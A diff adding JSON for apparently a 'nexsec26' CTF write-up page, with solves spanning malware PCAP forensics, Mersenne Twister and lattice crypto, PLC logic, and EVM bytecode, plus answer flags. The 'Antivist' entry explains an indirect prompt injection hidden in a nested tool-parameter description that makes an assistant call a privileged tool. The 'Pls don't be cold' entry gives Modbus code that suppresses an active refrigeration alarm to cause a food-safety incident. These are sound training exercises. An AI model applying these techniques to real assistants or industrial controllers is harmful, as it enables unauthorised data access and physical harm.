+                  "caption": "Question 8 evidence from the source write-up."
+                },
+                {
+                  "src": "assets/writeups/nexsec/n8n-11.webp",
+                  "alt": "n8n question evidence 9",
+                  "caption": "Question 9 evidence from the source write-up."
+                },
+                {
+                  "src": "assets/writeups/nexsec/n8n-12.webp",
+                  "alt": "n8n question evidence 10",
+                  "caption": "Question 10 evidence from the source write-up."
+                },
+                {
+                  "src": "assets/writeups/nexsec/n8n-13.webp",
+                  "alt": "n8n question evidence 11",
+                  "caption": "Question 11 evidence from the source write-up."
+                },
+                {
+                  "src": "assets/writeups/nexsec/n8n-14.webp",
+                  "alt": "n8n question evidence 12",
+                  "caption": "Question 12 evidence from the source write-up."
+                },
+                {
+                  "src": "assets/writeups/nexsec/n8n-15.webp",
+                  "alt": "n8n question evidence 13",
+                  "caption": "Question 13 evidence from the source write-up."
+                },
+                {
+                  "src": "assets/writeups/nexsec/n8n-16.webp",
+                  "alt": "n8n question evidence 14",
+                  "caption": "Question 14 evidence from the source write-up."
+                }
+              ]
+            },
+            {
+              "title": "Flag evidence",
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/n8n-18.webp",
+                  "alt": "n8n flag output",
+                  "caption": "The final n8n flag output from the source write-up."
+                }
+              ]
+            }
+          ],
+          "result": "",
+          "flag": "nexsec26{cdc591a76a6e05f352ed8953ec5e4a3e_45493594be36f65d0a3f262bc3cf486daf4f421eb957ffaee9ec1e8fe5e32f21}",
+          "tools": "",
+          "learned": ""
+        },
+        {
+          "title": "Dead Drop Latte",
+          "category": "Forensic",
+          "solver": "Ni5h",
+          "overview": "The challenge supplies a PCAPNG capture from a workstation that raised an alert after visiting a coffee-shop website. The goal is to trace the malicious delivery chain, recover the DNS-provided C2 configuration and keys, decrypt the outbound beacons, and extract the flag.",
+          "analysis": "I followed the capture in order: first establish its size and protocol mix, then isolate the suspicious web request and downloaded executable. Its strings reveal the encryption layout, which makes the DNS TXT records and encrypted POST bodies actionable rather than isolated artefacts.",
+          "steps": [
+            {
+              "title": "Identify the capture file",
+              "text": [
+                "I first verified the capture and collected its basic statistics. The source confirms a valid PCAPNG file containing 1,929 packets over approximately five minutes and 44 seconds; that establishes the scope before filtering traffic."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "file capture.pcapng && capinfos capture.pcapng"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/dead-drop-latte-1.webp",
+                  "alt": "Dead Drop Latte challenge page",
+                  "caption": "The challenge page introduces the suspicious coffee-site visit and supplied capture."
+                },
+                {
+                  "src": "assets/writeups/nexsec/dead-drop-latte-2.webp",
+                  "alt": "Capture file inspection",
+                  "caption": "`file` and `capinfos` confirm the PCAPNG format and packet count."
+                }
+              ]
+            },
+            {
+              "title": "Inventory the network protocols",
+              "text": [
+                "Next I examined the protocol hierarchy to choose the most useful leads. DNS, HTTP, TCP, and TLS are present; the source records 28 HTTP frames and 212 DNS frames, so HTTP and DNS became the initial focus for delivery, downloads, and C2 configuration."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "tshark -r capture.pcapng -q -z io,phs"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/dead-drop-latte-3.webp",
+                  "alt": "Protocol hierarchy statistics",
+                  "caption": "The hierarchy statistics show DNS, HTTP, TCP, and TLS traffic in the capture."
+                }
+              ]
+            },
+            {
+              "title": "Find the suspicious HTTP activity",
+              "text": [
+                "I listed HTTP requests with their frame numbers, endpoints, methods, and user agents. This exposes the coffee website at frame 328, the `clientverify.exe` download at frame 426, and four later `POST /t` requests that behave as encrypted beacons.",
+                "The sequence matters: the site visit is followed by the executable download and then outbound requests to several external addresses, providing a concrete infection timeline to inspect."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "tshark -r capture.pcapng -Y \"http.request\" -T fields \\\n-e frame.number -e frame.time -e ip.src -e ip.dst \\\n-e http.request.method -e http.request.full_uri -e http.request.uri \\\n-e http.user_agent"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/dead-drop-latte-4.webp",
+                  "alt": "Suspicious HTTP request list",
+                  "caption": "The HTTP listing shows the coffee website, executable download, and four beacon POST requests."
+                }
+              ]
+            },
+            {
+              "title": "Inspect the coffee-site response",
+              "text": [
+                "I extracted the HTML response from frame 330. It presents a fake human-verification flow that instructs the victim to run a PowerShell command.",
+                "The command launches PowerShell hidden with profile bypassing, downloads `clientverify.exe` to the temporary directory, and starts it. The write-up identifies this social-engineering pattern as ClickFix, making the web page the initial delivery mechanism."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "tshark -r capture.pcapng -Y \"frame.number==330\" \\\n-T fields -e http.file_data | xxd -r -p"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/dead-drop-latte-5.webp",
+                  "alt": "Coffee-site HTML response",
+                  "caption": "The extracted HTML contains the ClickFix-style PowerShell one-liner."
+                }
+              ]
+            },
+            {
+              "title": "Extract and profile the downloaded executable",
+              "text": [
+                "I extracted the body from frame 428 and checked its type. It is a Windows PE executable, matching the file delivered by the deceptive page.",
+                "Its strings reveal `cfg.ns-edge.net`, `key.ns-edge.net`, `POST /t`, DNS API and socket functions, and the encryption description `aes-256-gcm; iv=12; tag=16; aad=brew-v1; wire=b64(iv|ct|tag)`. Those details define how to decode the later network traffic."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "tshark -r capture.pcapng -Y \"frame.number==428\" \\\n-T fields -e http.file_data | xxd -r -p | file -\n\nstrings -a -n 4 /tmp/clientverify.exe"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/dead-drop-latte-6.webp",
+                  "alt": "Downloaded executable identification",
+                  "caption": "Frame 428 decodes to a Windows PE executable."
+                },
+                {
+                  "src": "assets/writeups/nexsec/dead-drop-latte-7.webp",
+                  "alt": "Executable string analysis",
+                  "caption": "The binary strings reveal DNS configuration, AES-GCM, and beaconing behaviour."
+                }
+              ]
+            },
+            {
+              "title": "Recover DNS configuration and keys",
+              "text": [
+                "I queried DNS TXT answers for names containing `ns-edge.net`. The `cfg` records are Base64-encoded IP-and-port pairs; decoding one produces `198.51.100.44:8080`, and the other decoded endpoints match the beacon destinations.",
+                "The `key` records provide candidate cryptographic secrets. This DNS-based configuration is why the malware can retrieve both dynamic C2 endpoints and keys before making HTTP beacon requests."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "tshark -r capture.pcapng \\\n-Y \"dns.qry.type==16 && dns.flags.response==1 && dns.qry.name contains \\\"ns-edge.net\\\"\" \\\n-T fields -e frame.number -e dns.qry.name -e dns.txt\n\necho \"MTk4LjUxLjEwMC40NDo4MDg5\" | base64 -d"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/dead-drop-latte-8.webp",
+                  "alt": "DNS TXT record extraction",
+                  "caption": "The DNS TXT output contains Base64-encoded configuration and key records."
+                },
+                {
+                  "src": "assets/writeups/nexsec/dead-drop-latte-9.webp",
+                  "alt": "Decoded C2 endpoint",
+                  "caption": "A Base64-decoded cfg value reveals a C2 IP and port."
+                }
+              ]
+            },
+            {
+              "title": "Extract and decrypt the POST beacons",
+              "text": [
+                "I extracted the HTTP bodies from the four `POST /t` requests. TShark displays them as hexadecimal strings; converting that representation back to bytes gives Base64 text, which matches the executable’s documented wire format.",
+                "I tested the six DNS TXT keys with AES-256-GCM. A wrong key fails authentication with `InvalidTag`; using the matching key decrypts the telemetry JSON. The third beacon contains the flag in its `note` field."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "tshark -r capture.pcapng \\\n-Y \"http.request.method==\\\"POST\\\" && http.request.uri==\\\"/t\\\"\" \\\n-T fields -e frame.number -e frame.time -e ip.dst -e data.data"
+                },
+                {
+                  "lang": "python",
+                  "text": "from cryptography.hazmat.primitives.ciphers.aead import AESGCM\n\nplaintext = AESGCM(key).decrypt(\n    iv,\n    ciphertext + tag,\n    b\"brew-v1\"\n)"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/dead-drop-latte-10.webp",
+                  "alt": "Encrypted beacon extraction",
+                  "caption": "The four POST bodies are extracted from the capture for Base64 and AES-GCM processing."
+                }
+              ]
+            }
+          ],
+          "result": "The capture shows a ClickFix delivery chain: a coffee-site response launches PowerShell, downloads `clientverify.exe`, obtains C2 configuration and keys through DNS TXT records, then sends AES-256-GCM encrypted telemetry beacons. Decrypting the third beacon reveals the flag.",
+          "flag": "nexsec26{l3ts_buy_s0me_c0ffee_2_stay_awake}",
+          "tools": "file, capinfos, TShark, strings, xxd, base64, Python 3, cryptography",
+          "learned": "A PCAP can reveal a complete malware chain when web delivery, DNS configuration, and C2 traffic are correlated in chronological order. AES-GCM authentication failures are useful during key testing because they reliably distinguish incorrect key-and-message pairs from valid decryptions."
+        }
+      ]
+    },
+    {
+      "name": "Crypto",
+      "slug": "crypto",
+      "challenges": [
+        {
+          "title": "Paradise",
+          "category": "Crypto",
+          "solver": "Kiellu4",
+          "overview": "Paradise provides `chall.py` on `koala.nexsec.my:39876`. It seeds CPython’s MT19937 with eight random bytes, generates a secret before leaking 966 top-16-bit outputs, and accepts only three seed-and-secret guesses.",
+          "analysis": "The secret comes before the leaks, so predicting the next output is insufficient. The write-up instead models tempering and the Mersenne Twister recurrence as GF(2) equations, recovers enough state to invert Python’s `init_by_array`, verifies the SHA-512-derived seed material, then submits the recovered seed and first secret.",
+          "steps": [
+            {
+              "title": "Inspect the challenge and leak model",
+              "text": [
+                "The supplied code creates an 8-byte seed, instantiates `Random(seed)`, immediately takes one 32-bit secret, then records 966 values of `rng.getrandbits(32) >> 16`. The server prints that leak list before asking for `Seed (hex)` and `Secret`."
+              ],
+              "code": [
+                {
+                  "lang": "python",
+                  "text": "seed = randbytes(8)\nrng = Random(seed)\nsecret = rng.getrandbits(32)\n\nfor _ in range(624 * 32 // 20 - 32):\n    something.append(rng.getrandbits(32) >> 16)"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/paradise-1.webp",
+                  "alt": "Paradise challenge prompt",
+                  "caption": "The challenge page provides `chall.py` and the submission form."
+                }
+              ]
+            },
+            {
+              "title": "Build the GF(2) equations",
+              "text": [
+                "For outputs 1 through 343, each leaked top-half value supplies 16 linear equations over the 32 bits of its tempered state word. The MT recurrence supplies another 16 equations for each `k = 0..342`, using `leaked[623+k] ^ leaked[396+k]`.",
+                "The only extra unknown is bit 31 of `w_0`; the solver represents it as one additional variable. This produces 10,976 equations in 10,977 unknowns, leaving a single free bit to test."
+              ],
+              "code": [
+                {
+                  "lang": "text",
+                  "text": "F(temper(w_n)) = leaked[n - 1]\nF(temper(twist_term(w_k, w_{k+1}))) = leaked[623 + k] ^ leaked[396 + k]"
+                }
+              ]
+            },
+            {
+              "title": "Untwist and invert Python seeding",
+              "text": [
+                "The recovered first-block words are untwisted backward to obtain state words needed by Python’s `init_by_array`. The solver reverses pass 2, then pass 1, to recover the 18 key words.",
+                "Those 72 bytes are `seed || sha512(seed)`. The SHA-512 tail check and a forward replay of all leaked top halves reject incorrect assignments before the server is contacted."
+              ],
+              "code": [
+                {
+                  "lang": "python",
+                  "text": "blob = key_int.to_bytes(72, \"big\")\nseed = blob[:8]\ntail = blob[8:]\nassert hashlib.sha512(seed).digest() == tail\nsecret = Random(seed).getrandbits(32)"
+                }
+              ]
+            },
+            {
+              "title": "Run the full solver",
+              "text": [
+                "The complete source-listed solver is supplied as a download. The PDF’s code spans pages 74–80; it is preserved as a text transcription because PDF extraction breaks Python indentation, so it is not presented as a runnable file without a confident reconstruction."
+              ],
+              "files": [
+                {
+                  "path": "assets/writeups/nexsec/files/paradise-solver-source.txt",
+                  "label": "Download full solver source transcription"
+                }
+              ]
+            },
+            {
+              "title": "Submit and verify",
+              "text": [
+                "The remote run reports 966 leaks, one free variable, a successful forward verification, seed `3f6167a1a56b9c4d`, and secret `840528057`. Submitting them returns the flag."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "python3 solve.py --remote koala.nexsec.my 39876"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/paradise-2.webp",
+                  "alt": "Paradise solver output",
+                  "caption": "The verified remote solver run prints the recovered seed, secret, and flag."
+                }
+              ]
+            }
+          ],
+          "result": "The GF(2) state recovery and inverse seeding checks recover the exact 8-byte seed and the secret generated before the leak list. The remote service accepts both values and returns the flag.",
+          "flag": "nexsec26{w0w_y0u_already_kn0w_Mersenne_Twister_nice_ecbbe0daa563c783470a616eba1edcdef820ee1e5732bb3741bf5da36646a7b6}",
+          "tools": "Python 3, CPython random.Random / MT19937, SHA-512, sockets",
+          "learned": "Partial MT19937 output can still be sufficient when tempering and recurrence relations are expressed over GF(2). Python’s `Random(seed)` seeding format adds a strong verification condition because the recovered key material must contain a valid SHA-512 digest of the seed."
+        },
+        {
+          "title": "Mirror Image",
+          "category": "Crypto",
+          "solver": "Kiellu4",
+          "overview": "Mirror Image gives 112 pairs of 16-bit residues for a hidden 1024-bit integer `s`; exactly one value in each pair is `s mod m`. SHA-256 of `s` encrypts the flag with AES-GCM, so the objective is to recover the unique small CRT solution without enumerating 2^112 choices.",
+          "analysis": "The product of the moduli is about 2^1736 while `s < 2^1024`, so the correct residue selection is uniquely small. The write-up converts each two-choice congruence into a Hidden Number Problem and uses an LLL lattice embedding to recover `s`.",
+          "steps": [
+            {
+              "title": "Read the mirror construction",
+              "text": [
+                "The service creates 112 random 16-bit primes and, for each, prints the true residue and one random decoy in random order. It then hashes the 1024-bit secret and encrypts the flag as the final `ward` value.",
+                "Knowing one correct residue from each pair would make CRT immediate, but trying both shadows for every mirror would require 2^112 combinations."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/mirror-image-1.webp",
+                  "alt": "Mirror Image challenge page",
+                  "caption": "The challenge page supplies `chall.py` and describes the mirror-and-shadow premise."
+                }
+              ]
+            },
+            {
+              "title": "Embed the choices in a lattice",
+              "text": [
+                "For each mirror, the solver treats the two values as `a_i` and `b_i`, computes `Δ_i = (b_i - a_i) mod m_i`, and represents the unknown choice with a bit δ_i. The lattice uses weight `W = 2^1024` so the δ coordinates and secret coordinate have comparable magnitude.",
+                "The basis has dimension 114: diagonal `W*m_i` rows eliminate carries, an inverse row carries `s`, and the base row creates the embedding marker. The desired short vector has the form `(W·δ_0, …, W·δ_n−1, s, −W)`."
+              ],
+              "code": [
+                {
+                  "lang": "sage",
+                  "text": "W = 2**1024\ndiff = [(b_i[i] - a_i[i]) % ms[i] for i in range(len(ms))]\ninv = [inverse_mod(diff[i], ms[i]) for i in range(len(ms))]\nbase = [(a_i[i] * inv[i]) % ms[i] for i in range(len(ms))]\nred = L.LLL()"
+                }
+              ]
+            },
+            {
+              "title": "Recover and verify the caster",
+              "text": [
+                "The Sage solver searches the reduced basis for a row whose marker coordinate is ±W, reads the corresponding candidate from the secret coordinate, and verifies that it lies below 2^1024 and matches one value in every mirror pair. If LLL misses, the source tries BKZ block sizes 20, 30, and 40.",
+                "Once verified, the recovered integer becomes the SHA-256 input for AES-GCM decryption of the ward."
+              ],
+              "code": [
+                {
+                  "lang": "sage",
+                  "text": "def verify(s):\n    return 0 < s < 2**1024 and all((s % ms[i]) in opts[i] for i in range(n))"
+                }
+              ]
+            },
+            {
+              "title": "Use the full source-listed solver",
+              "text": [
+                "The complete Sage solver is preserved as a sanitised source transcription. It is a text download rather than a claimed runnable reconstruction because the PDF splits Python/Sage indentation across pages."
+              ],
+              "files": [
+                {
+                  "path": "assets/writeups/nexsec/files/mirror-image-solver-source.txt",
+                  "label": "Download full solver source transcription"
+                }
+              ]
+            },
+            {
+              "title": "Run Sage and verify the flag",
+              "text": [
+                "Running `sage solve.sage` parses all 112 mirrors, reduces the 114-dimensional lattice, verifies `s` against every mirror, and prints the flag."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "sage solve.sage"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/mirror-image-2.webp",
+                  "alt": "Mirror Image Sage output",
+                  "caption": "The Sage run reports a 114-dimensional lattice, verifies the secret against every mirror, and prints the flag."
+                }
+              ]
+            }
+          ],
+          "result": "LLL finds the uniquely small residue assignment, producing a secret consistent with all 112 mirrors. Hashing that recovered value decrypts the AES-GCM ward and yields the flag.",
+          "flag": "nexsec26{YOU_WILL_NEVER_CATCH_ME_HIDING_BETWEEN_ALL_OF_THESE_MIRRORS_D20_I_CAST_MIRROR_IMAGE_3e607901e6cb9d3a13c770ae03e45c0c7a8ade2a54bd9c4f892c466a2a9d704c}",
+          "tools": "SageMath, LLL, BKZ, CRT reasoning, SHA-256, AES-GCM",
+          "learned": "A large ambiguous CRT system can become tractable when the correct solution has a known size bound. Lattice scaling and an embedding coordinate make the desired bit-choice and secret vector stand out to LLL."
+        }
+      ]
+    },
+    {
+      "name": "Misc",
+      "slug": "misc",
+      "challenges": [
+        {
+          "title": "Lumi the Analyst",
+          "category": "Misc",
+          "solver": "Kiellu4",
+          "overview": "A MicroLogix 1100 grinder controller has a missing approved ladder-rung page and a live Modbus/TCP service. One run-permissive contact differs from the approved Motor_Run baseline; the task is to identify it and construct the flag.",
+          "analysis": "I reconstructed the expected permissives from the functional description and point map, then compared that baseline to repeated live input and coil observations rather than trusting one sample.",
+          "steps": [
+            {
+              "title": "Reconstruct the approved baseline",
+              "text": [
+                "The baseline Motor_Run rung requires XIO I:1/0 (guard closed), XIO I:1/1 (E-stop not pressed), XIC I:1/2 (LOCAL), and XIO I:1/5 (no thermal trip). I:1/3 is only the maintenance-key annunciator and is not an approved run permissive."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/lumi-the-analyst-1.webp",
+                  "alt": "Lumi the Analyst challenge",
+                  "caption": "The challenge page provides the PLC artefacts and live service."
+                }
+              ]
+            },
+            {
+              "title": "Read the resident checksum",
+              "text": [
+                "I polled holding registers 2 and 3 with zero-based Modbus addressing. Their combined value is `0x6F3A91D4`, which differs from the signed baseline checksum `0x5C14A7B3`; the live program was modified."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "mbpoll -m tcp -a 1 -0 -t 4 -r 2 -c 2 koala.nexsec.my -p 37016"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/lumi-the-analyst-2.webp",
+                  "alt": "Live Modbus checksum poll",
+                  "caption": "The holding-register poll supplies the two halves of the resident checksum."
+                }
+              ]
+            },
+            {
+              "title": "Prove the substituted permissive",
+              "text": [
+                "Polling inputs and coils through the test pattern shows Motor_Run is on while GuardDoor_Open is 1, but I:1/3 is always 1 whenever the motor runs. The changed contact is therefore `XIC I:1/3`, replacing baseline `XIO I:1/0`."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "mbpoll -m tcp -a 1 -0 -t 1 -r 0 -c 6 koala.nexsec.my -p 37016\nmbpoll -m tcp -a 1 -0 -t 0 -r 0 -c 4 koala.nexsec.my -p 37016"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/lumi-the-analyst-3.webp",
+                  "alt": "Lumi solver output",
+                  "caption": "The solve output identifies I:1/3 as the swapped-in permissive and prints the flag."
+                }
+              ],
+              "files": [
+                {
+                  "path": "assets/writeups/nexsec/files/lumi-the-analyst-solver-source.txt",
+                  "label": "Download full solver source transcription"
+                }
+              ]
+            }
+          ],
+          "result": "The maintenance keyswitch replaced the guard-door permissive, allowing the motor to run with the guard open.",
+          "flag": "nexsec26{XIO_I_1_0_XIC_I_1_3_6F3A91D4}",
+          "tools": "mbpoll, Modbus/TCP, Python",
+          "learned": "A checksum proves a program changed, but repeated correlation of live inputs and coils identifies the unsafe logic substitution."
+        },
+        {
+          "title": "Very Fest",
+          "category": "Misc",
+          "solver": "Kiellu4",
+          "overview": "The handout contains a README hint to EVM bytecode analysis and a 1,268-character ASCII hex file, `VeryFest.evm`. The objective is to disassemble the EVM bytecode and recover the embedded flag fragments.",
+          "analysis": "The raw text is EVM bytecode, so I used erever to disassemble it. The disassembly highlights PUSH32 constants that are hex-encoded ASCII rather than executable control-flow data.",
+          "steps": [
+            {
+              "title": "Inspect the files",
+              "text": [
+                "I listed the handout, confirmed `VeryFest.evm` is a long one-line ASCII text file, and read the README hint."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "ls\nfile VeryFest.evm\ncat README.md"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/very-fest-1.webp",
+                  "alt": "Very Fest challenge",
+                  "caption": "The challenge page provides the README and EVM bytecode file."
+                },
+                {
+                  "src": "assets/writeups/nexsec/very-fest-2.webp",
+                  "alt": "Very Fest file inspection",
+                  "caption": "The terminal confirms the long ASCII EVM bytecode and the re.hanz.dev hint."
+                },
+                {
+                  "src": "assets/writeups/nexsec/very-fest-3.webp",
+                  "alt": "VeryFest bytecode contents",
+                  "caption": "The file contents are a single long hexadecimal string."
+                }
+              ]
+            },
+            {
+              "title": "Disassemble and decode PUSH data",
+              "text": [
+                "I installed erever and disassembled the bytecode. Three highlighted PUSH32 values are hexadecimal text fragments. Decoding them from hex and concatenating them gives the flag."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "uv tool install git+https://github.com/minaminao/erever.git\nerever disassemble -b \"<VeryFest.evm hex>\""
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/very-fest-4.webp",
+                  "alt": "EVM disassembly",
+                  "caption": "The disassembly highlights the three PUSH32 hexadecimal string fragments."
+                },
+                {
+                  "src": "assets/writeups/nexsec/very-fest-5.webp",
+                  "alt": "CyberChef hex decoding",
+                  "caption": "Decoding and joining the fragments produces the complete flag."
+                }
+              ]
+            }
+          ],
+          "result": "The EVM bytecode stores the flag as three ASCII strings in PUSH32 instructions.",
+          "flag": "nexsec26{decentralization_means_giving_up_dominance_over_security}",
+          "tools": "file, erever, CyberChef",
+          "learned": "EVM disassembly makes embedded PUSH-data constants easy to distinguish from opcodes. Hex constants in bytecode should be checked for readable ASCII before treating them as opaque values."
+        },
+        {
+          "title": "Antivist",
+          "category": "Misc",
+          "solver": "Ha1qal",
+          "overview": "An extension registry sanitises only the top-level manifest description while the assistant receives nested parameter descriptions as authoritative schema context. The task is to exploit that mismatch to induce its authorised `read_ledger` tool call.",
+          "analysis": "The bypass is an indirect prompt injection/confused-deputy issue: keep the visible extension description benign and place the directive inside a parameter-description field that reaches the model unsanitised.",
+          "steps": [
+            {
+              "title": "Create an extension session",
+              "text": [
+                "The source registers a test extension account and retains its cookie jar for subsequent requests."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "curl -s -c /tmp/cj -b /tmp/cj -X POST http://koala.nexsec.my:35117/register \\\n  --data-urlencode \"slug=<test-slug>\" --data-urlencode \"password=<password>\""
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/antivist-1.webp",
+                  "alt": "Antivist challenge page",
+                  "caption": "The challenge describes the assistant, extension registry, and partial source release."
+                }
+              ]
+            },
+            {
+              "title": "Publish the nested directive and read the transcript",
+              "text": [
+                "I published `meta_helper` with a clean top-level description, but put an instruction to call `read_ledger` in the nested parameter documentation. Triggering the assistant creates a run; reading its transcript shows the tool result and flag."
+              ],
+              "code": [
+                {
+                  "lang": "bash",
+                  "text": "curl -s -b /tmp/cj http://koala.nexsec.my:35117/ask \\\n  --data-urlencode \"message=Use the meta_helper extension to describe the extension named meta_helper.\"\ncurl -s -b /tmp/cj http://koala.nexsec.my:35117/runs/3"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/antivist-2.webp",
+                  "alt": "Antivist run transcript",
+                  "caption": "The run transcript shows the induced `read_ledger` call and returned flag."
+                }
+              ]
+            }
+          ],
+          "result": "A directive hidden in an unsanitised nested parameter description causes the assistant to act as a confused deputy and disclose the ledger result.",
+          "flag": "nexsec26{c0c48a6e877e4b4de67f1a78f1bbef858a56fa724a4695fa69402d89e91}",
+          "tools": "curl, HTTP cookies, extension manifests",
+          "learned": "Sanitising only visible top-level fields is insufficient when nested schema documentation is later treated as trusted model context. Tool authorisation must be enforced by the application, not delegated to natural-language instructions."
+        },
+        {
+          "title": "Pls don't be cold",
+          "category": "Misc",
+          "solver": "Ha1qal",
+          "overview": "The handout contains Python 3.14 bytecode and maintenance-tunnel services: a Modbus/TCP fieldbus and FrostLink web console. The goal is to recover the daily service token and trigger a real food-safety incident.",
+          "analysis": "Older decompilers produced incorrect Python 3.14 output, so the write-up disassembles with a native 3.14 interpreter. The recovered code reveals a date-based token used both for web service authentication and Modbus write unlocks.",
+          "steps": [
+            {
+              "title": "Disassemble with the matching interpreter",
+              "text": [
+                "I installed Python 3.14 through `uv` and used `dis.dis()` on the marshalled bytecode. This recovers the service-token algorithm accurately, avoiding the incorrect decompiler output."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/pls-dont-be-cold-1.webp",
+                  "alt": "Pls don't be cold challenge page",
+                  "caption": "The challenge page provides the bytecode handout and two maintenance-tunnel services."
+                },
+                {
+                  "src": "assets/writeups/nexsec/pls-dont-be-cold-2.webp",
+                  "alt": "Python 3.14 disassembly",
+                  "caption": "The sanitised native disassembly establishes the correct bytecode-analysis approach."
+                }
+              ]
+            },
+            {
+              "title": "Authenticate and map the fieldbus",
+              "text": [
+                "For 2026-10-17, the recovered algorithm yields service token `07610f86`, split as HR0 `0x0761` and HR1 `0x0f86`. The panel register map identifies coil 0 as MT1 defrost hold and coil 8 as the MT1 alarm-enable control."
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/pls-dont-be-cold-3.webp",
+                  "alt": "FrostLink register map",
+                  "caption": "The panel register map shows the coils and holding registers used in the incident sequence."
+                }
+              ]
+            },
+            {
+              "title": "Trigger the active-alarm incident",
+              "text": [
+                "I held MT1 defrost until its temperature passed the 8.0 °C alarm threshold, then suppressed coil 8 only after `alarm_active` became true. Keeping defrost active let MT1 exceed the 12.0 °C incident threshold while the alarm was suppressed, which latched the incident."
+              ],
+              "code": [
+                {
+                  "lang": "python",
+                  "text": "c.write_coil(0, True, device_id=1)   # defrost hold MT1\nc.write_coil(8, True, device_id=1)   # alarm enabled\nif mt1[\"alarm_active\"]:\n    unlock()\n    c.write_coil(8, False, device_id=1)  # suppress while hot"
+                }
+              ],
+              "images": [
+                {
+                  "src": "assets/writeups/nexsec/pls-dont-be-cold-4.webp",
+                  "alt": "Incident record and flag",
+                  "caption": "The successful incident record shows the final flag."
+                }
+              ],
+              "files": [
+                {
+                  "path": "assets/writeups/nexsec/files/pls-dont-be-cold-solver-source.txt",
+                  "label": "Download full solver source transcription"
+                }
+              ]
+            }
+          ],
+          "result": "Suppressing an active high-temperature alarm while MT1 remains above its safe threshold triggers the recorded critical food-safety incident.",
+          "flag": "nexsec26{dont-be-so-cold-to-me,-i'll-get-flu_1601c791820a653d6f53cb8fef09d7d1b40fad91e63688a0df7f4d15692e6827}",
+          "tools": "Python 3.14, dis, uv, Modbus/TCP, HTTP",
+          "learned": "Bytecode should be analysed with a matching interpreter when decompiler opcode tables lag behind. The sequence of control actions matters: suppressing an inactive alarm is not equivalent to suppressing an active alarm during an over-temperature condition."
+        }
+      ]
+    }
+  ]
 }
